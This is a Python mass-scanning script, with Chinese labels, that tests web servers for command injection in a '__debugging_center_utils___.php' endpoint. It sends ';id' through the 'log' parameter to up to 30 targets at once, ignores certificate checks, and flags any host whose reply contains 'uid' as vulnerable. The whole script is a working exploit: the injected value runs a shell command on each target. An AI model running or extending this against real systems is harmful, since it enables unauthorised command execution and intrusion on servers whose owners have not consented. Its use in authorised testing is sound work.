import warnings

import requests
import sys, argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

warnings.filterwarnings("ignore")
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers',
    'Connection': 'close',
}
def main():
    argparser = argparse.ArgumentParser("检测工具")
    argparser.add_argument("-u", "--url", dest="target", help="检测url")
    argparser.add_argument("-f", "--file", dest="file", help="批量检测")
    arg=argparser.parse_args()
    pool = Pool(processes=30)
    targets=[]
    if arg.target:
        check(arg.target)
    elif arg.file:
        try:
            with open(arg.file,"r",encoding="utf-8") as f:
                line = f.readlines()
                for line in line:
                    if "http" in line:
                        line = line.strip()
                        targets.append(line)
                    else:
                        line="http://"+line
                        targets.append(line)
        except Exception as e:
            print("[ERROR]")
        pool.map(check,targets)


def check(target):
    target=f"{target}/__debugging_center_utils___.php?log=;id "
    r=requests.get(target,headers=headers,verify=False,timeout=3)

    if r.status_code==200 and "uid" in r.text:
        print(f"存在漏洞{target}")
if __name__ == '__main__':
    main()